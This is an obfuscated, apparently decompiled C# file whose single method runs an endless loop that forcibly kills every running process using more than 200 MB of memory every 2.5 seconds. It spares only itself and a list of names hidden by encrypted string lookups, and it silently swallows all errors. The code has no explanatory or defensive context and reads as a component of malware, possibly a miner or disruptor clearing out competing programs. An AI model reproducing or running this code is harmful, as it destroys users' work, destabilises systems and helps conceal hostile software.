using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

public static class kSGHIIvRxzbCM
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void fyAgivVrzhBD()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107401038)) && !process.ProcessName.Contains(getString_0(107401061)) && !process.ProcessName.Contains(getString_0(107401052)) && !process.ProcessName.Contains(getString_0(107401011)) && !process.ProcessName.Contains(getString_0(107400998)) && !process.ProcessName.Contains(getString_0(107401017)) && !process.ProcessName.Contains(getString_0(107400972)) && !process.ProcessName.Contains(getString_0(107400991)) && !process.ProcessName.Contains(getString_0(107400946)) && !process.ProcessName.Contains(getString_0(107400965)) && !process.ProcessName.Contains(getString_0(107401424)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static kSGHIIvRxzbCM()
	{
		Strings.CreateGetStringDelegate(typeof(kSGHIIvRxzbCM));
	}
}
